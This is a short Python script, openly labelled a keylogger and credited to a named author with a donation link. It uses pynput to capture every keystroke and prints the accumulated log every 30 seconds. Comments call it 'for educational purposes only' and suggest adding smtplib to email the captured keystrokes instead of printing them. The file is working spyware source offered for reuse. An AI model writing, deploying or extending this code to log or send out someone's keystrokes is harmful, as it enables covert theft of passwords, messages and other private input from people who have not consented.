import pynput.keyboard              #PYTHON KEY-LOGGER
import time
import threading

log=""                              #Created By: Omkar Reddy
                                      #Buy me a Coffee at:
                                         #  "https://buymeacoffee.com/omkarreddyf"
def callback_function(key):
    global log
    try:
        log=log+str(key.char)       #  1> hey broo feel free to use my code 
    except AttributeError:          #    it's open sourced   
        if key == key.space:
            log=log + " "           #  2> USE IT FOR EDUCATIONAL PURPOSES ONLY!
        elif key == key.enter:
            log=log + "\n"          #  3>You can include smtplib and send an email
        elif key == key.backspace:  #    instead of printing in function print_key_log()
            log = log[:-1]
        else:
            log=log+str(key)
    except:
         pass

    #print(log)
        
   #^             #remove the hash before print to test it manually in the same devie
   #|                         |
   #|-----<--------<---------<-
def print_key_log():
    global log
    print(log)
    log = ""
    timer_object = threading.Timer(30,print_key_log)
    timer_object.start()
    

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

with keylogger_listener:
    print_key_log()
    keylogger_listener.join()
